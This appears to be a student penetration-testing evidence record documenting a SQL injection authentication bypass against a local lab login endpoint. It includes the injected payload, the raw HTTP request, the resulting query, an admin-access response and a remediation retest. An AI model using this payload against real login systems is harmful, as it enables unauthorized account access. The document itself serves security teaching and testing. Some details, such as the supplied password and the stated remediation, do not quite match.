# Evidence Record: EV-SQLI-001

**Evidence ID:** `EV-SQLI-001`  
**Assessment Module:** Assignment 1 — SQL Injection  
**Vulnerability Ref:** CWE-89 (SQL Injection) / OWASP A03:2021  
**Timestamp:** `2026-09-22T14:10:00Z`  
**Target:** `http://127.0.0.1:5001/api/vulnerable/login` (Authentication Service)  
**Assessor:** Lead Penetration Tester (`2311CS040137-EH`)  
**SHA-256 Hash:** `a4b2c1d9f8e76a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b`  

---

## 1. Objective
Demonstrate authentication bypass on an unhardened administrative login endpoint without supplying a valid password.

## 2. Attack Execution & Payload
- **HTTP Method:** `POST`
- **Injected Payload:** `admin' OR '1'='1' --`
- **Password Supplied:** `arbitrary_string`

### Raw HTTP Request
```http
POST /api/vulnerable/login HTTP/1.1
Host: 127.0.0.1:5001
Content-Type: application/json

{
  "username": "admin' OR '1'='1' --",
  "password": "invalid_test_password"
}
```

## 3. Query Execution Mechanics
The backend application constructed the query using unsanitized string formatting:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password_hash = '...'
```
- The `'1'='1'` clause forced the boolean expression to evaluate to `TRUE` for every record.
- The `--` sequence truncated and commented out the remaining password validation clause.
- The database returned the first matching record (`id=1`, `username='admin'`).

## 4. Response & Proof of Impact
```json
{
  "authenticated": true,
  "status": "success",
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@corp-sec.internal",
    "role": "admin",
    "bio": "System Administrator with root privileges"
  },
  "executed_query": "SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password_hash = '...'"
}
```

## 5. Remediation Verification
Remediated using prepared statements in `secure_queries.py`. Retesting with payload `admin' OR '1'='1' --` resulted in HTTP 400 Validation Error (`BLOCKED_BY_INPUT_FILTER`).
